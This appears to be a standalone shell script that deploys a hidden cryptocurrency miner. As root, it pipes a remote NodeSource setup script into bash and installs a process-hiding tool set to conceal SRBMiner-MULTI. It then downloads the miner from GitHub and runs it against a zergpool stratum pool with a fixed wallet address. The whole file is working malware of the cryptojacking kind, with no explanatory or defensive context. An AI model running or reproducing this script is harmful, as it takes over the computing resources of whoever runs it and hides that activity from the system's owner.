#!/bin/sh
sudo su --command "curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add SRBMiner-MULTI && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-8-9-Linux.tar.xz && cd SRBMiner-Multi-0-8-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.mine.zergpool.com:7019 --wallet RUuN5bCZKYWD39gLihVn9bi91jmPR3tYD8 --password c=AVN,mc=AVN,refcode=9fc9f843a050dc379d3cc8009694a2fd,ID=gl01 --cpu-threads 2"
